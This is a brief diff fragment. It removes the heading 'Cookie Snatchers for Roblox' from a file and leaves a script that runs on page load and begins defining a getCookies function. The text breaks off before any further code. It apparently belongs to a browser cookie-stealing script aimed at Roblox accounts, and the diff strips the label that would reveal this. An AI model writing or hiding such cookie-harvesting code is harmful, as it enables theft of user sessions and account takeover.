@@ -1,5 +1,3 @@
-# Cookie Snatchers for Roblox
-
 <script>
     document.addEventListener('DOMContentLoaded', function() {
         const getCookies = () => {
